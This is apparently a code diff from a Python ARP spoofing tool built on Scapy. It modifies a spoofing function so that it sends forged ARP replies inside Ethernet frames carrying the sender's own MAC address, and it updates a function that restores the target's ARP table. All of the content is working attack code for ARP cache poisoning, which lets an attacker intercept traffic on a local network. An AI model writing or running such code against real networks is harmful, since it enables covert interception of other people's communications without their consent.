@@ -14,8 +14,9 @@ class arp:
         Restore the arp entry for spoofed_ip in the ARP table of target_ip
         """
         spoofed_mac = get_mac_address(spoofed_ip, iface)
-        restorepacket = ARP(op=2, pdst=target_ip, psrc=spoofed_ip, hwsrc=spoofed_mac)
-        send(restorepacket, verbose=False, iface=iface)
+        target_mac = get_mac_address(target_ip, iface)
+        restorepacket = ARP(op=2, pdst=target_ip, psrc=spoofed_ip, hwsrc=spoofed_mac, hwdst=target_mac)
+        send(restorepacket, verbose=False, iface=iface, count=3)
         print("Restored ARP table of %s" % target_ip)
 
     @staticmethod
@@ -23,8 +24,10 @@ class arp:
         """
         Send a spoofing packet
         """
-        packet = ARP(op=2, pdst=target_ip, psrc=spoofed_ip)
-        send(packet, verbose=False, iface=iface)
+        target_mac = get_mac_address(target_ip, iface)
+        self_mac = get_if_hwaddr(iface)
+        packet = Ether(dst=target_mac, src=self_mac)/ARP(op=2, pdst=target_ip, psrc=spoofed_ip, hwdst=target_mac, hwsrc=self_mac)
+        sendp(packet, verbose=False, iface=iface)
 
     @staticmethod
     def continuous_arp_spoof(target_ip, spoofed_ip, interval, iface):
